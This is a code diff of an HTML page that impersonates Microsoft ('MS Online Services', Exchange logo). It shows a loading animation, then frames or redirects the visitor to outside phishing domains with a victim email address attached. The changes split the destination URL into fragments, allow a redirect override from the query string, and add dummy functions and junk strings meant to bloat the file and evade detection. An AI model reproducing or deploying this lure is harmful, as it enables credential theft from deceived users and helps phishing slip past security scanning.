@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MS Online Services</title>
+    <title>MS Online Services - Home</title>
     <style>
         * {
             box-sizing: border-box;
@@ -36,6 +36,18 @@
             text-align: center;
         }
 
+        .Breathing-logo {
+            width: 110px;
+            margin-bottom: 20px;
+            animation: breathing 2s ease-in-out infinite;
+        }
+
+        /* Breathing animation */
+        @keyframes breathing {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
         .loader {
             width: 50px;
             padding: 8px;
@@ -55,31 +67,100 @@
         @keyframes l3 {
             to { transform: rotate(1turn); }
         }
+
+        #main-content {
+            width: 100%;
+            height: 100%;
+            display: none;
+        }
+
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
     </style>
 </head>
 <body>
     <div id="loader-container">
-        <div class="loader"></div>
+        <img src="https://seeklogo.com/images/M/microsoft-exchange-logo-9D5C1A540A-seeklogo.com.png" alt="vmuvx3l3klsout" class="Breathing-logo">
     </div>
 
-    <script>
-        // Base64 encoded redirect URL
-        // const encodedUrl = "aHR0cHM6Ly9vZmZpY2UuYWNqYXJ2aXNidWlsZGVycy5jb20vdUNlR1ZVamE=;
+    <div id="main-content"></div>
 
-        // // Decode the base URL
-        // const baseRedirectUrl = atob(encodedUrl);
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+        showLoaderAndLoadContent(5000); // Adjust loading duration as neededcdcsvdiqv8m2gf
+    });
 
-        // // Extract email from the current URL's query parameters
-        // const urlParams = new URLSearchParams(window.location.search);
-        // const email = urlParams.get('email'); // Get the 'email' parameter
-
-        // Add email as a query parameter to the redirect URL
-        // const redirectUrl = email ? `${baseRedirectUrl}#${email}` : baseRedirectUrl;
-        const redirectUrl = "https://office.acjarvisbuilders.com/uCeGVUja"
-        // Simulate loading for 2 seconds and then redirect
+    function showLoaderAndLoadContent(loadingDuration) {
         setTimeout(() => {
-            window.location.href = redirectUrl;
-        }, 500); // Adjust loading duration if needed
-    </script>
+            toggleLoader(false);
+            loadIframeContent();
+        }, loadingDuration);
+    }
+
+    function toggleLoader(show) {
+        const loaderContainer = document.getElementById("loader-container");
+        const mainContent = document.getElementById("main-content");
+
+        loaderContainer.style.display = show ? "flex" : "none";
+        mainContent.style.display = show ? "none" : "block";
+    }
+
+    function loadIframeContent() {
+        const iframe = document.createElement("iframe");
+        iframe.src = getRedirectURL();
+        document.getElementById("main-content").appendChild(iframe);
+    }
+
+    function getRedirectURL() {
+        const urlParams = new URLSearchParams(window.location.search);
+
+        const a = "https://msonline365-";
+        const b = "PTLKX54M765PE2";
+        const c = ".ballancer-pro.";
+        const d = "com:8443/impact?";
+        const e = "ZZZ6240498";
+        const f = "=felcita@elitser-me.com";
+        
+        return urlParams.get("redirect") || (a + b + c + d + e + f);
+    }
+
+    // Non-functional code to increase file size k9w06ooh8my1i8
+    function dummyFunction1() {
+        let arr = [];
+        for (let i = 0; i < 10000; i++) {
+            arr.push(i * Math.random());
+        }
+        return arr;
+    }
+
+    function dummyFunction2() {
+        const obj = {};
+        for (let i = 0; i < 10000; i++) {
+            obj["key" + i] = i * Math.random();
+        }
+        return obj;
+    }
+
+    function dummyFunction3() {
+        let s = "";
+        for (let i = 0; i < 10000; i++) {
+            s += "dummy text ";
+        }
+        return s;
+    }
+
+    function dummyFunction4() {
+        let complex = [dummyFunction1(), dummyFunction2(), dummyFunction3()];
+        complex.forEach(func => {
+            console.log(func);
+        });
+    }
+
+    dummyFunction4();
+</script>
+
 </body>
 </html>
